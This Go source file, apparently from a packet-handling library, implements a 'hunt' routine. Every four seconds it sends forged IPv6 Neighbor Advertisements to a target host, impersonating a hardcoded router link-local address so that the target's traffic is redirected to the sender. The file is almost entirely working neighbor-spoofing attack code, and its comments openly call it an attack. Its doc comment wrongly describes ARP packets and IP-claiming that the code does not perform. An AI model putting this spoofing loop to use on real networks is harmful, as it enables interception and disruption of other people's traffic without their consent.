package icmp6

import (
	"fmt"
	"net"
	"time"

	"log"

	"github.com/irai/packet"
)

// StartHunt implements packet processor interface
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		log.Printf("icmp6 force neighbor spoof %s", addr)
	}
	ip := net.ParseIP("fe80::ce32:e5ff:fe0e:67f4") // my home router
	fmt.Println("icmp6 : FIXME ROUTER IP LLA IS HARDCODED")
	srcAddr := packet.Addr{IP: ip, MAC: h.engine.NICInfo.HostMAC}
	go h.spoofLoop(srcAddr, addr)

	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		log.Printf("icmp6 stop neighbor spoof %s", addr)
	}
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(srcAddr packet.Addr, dstAddr packet.Addr) {

	// 4 second re-do seem to be adequate;
	ticker := time.NewTicker(time.Second * 4).C
	startTime := time.Now()
	nTimes := 0
	log.Printf("icmp6: na attack ip=%s time=%v", dstAddr.IP, startTime)
	for {
		host := h.engine.MustFindIP(dstAddr.IP) // will lock/unlock engine
		host.Row.RLock()
		if host.GetICMP6StoreNoLock().HuntStage != packet.StageHunt || h.closed {
			host.Row.RUnlock()
			log.Printf("icmp6: attack end ip=%s repeat=%v duration=%v", dstAddr.IP, nTimes, time.Now().Sub(startTime))
			return
		}
		host.Row.RUnlock()

		if err := h.SendNeighborAdvertisement(srcAddr, dstAddr); err != nil {
			fmt.Println("icmp6: error sending na ", err)
		}

		if nTimes%16 == 0 {
			log.Printf("icmp6 attack %s repeat=%v duration=%v", dstAddr, nTimes, time.Now().Sub(startTime))
		}
		nTimes++

		select {
		case <-h.closeChan:
		case <-ticker:
		}
	}
}
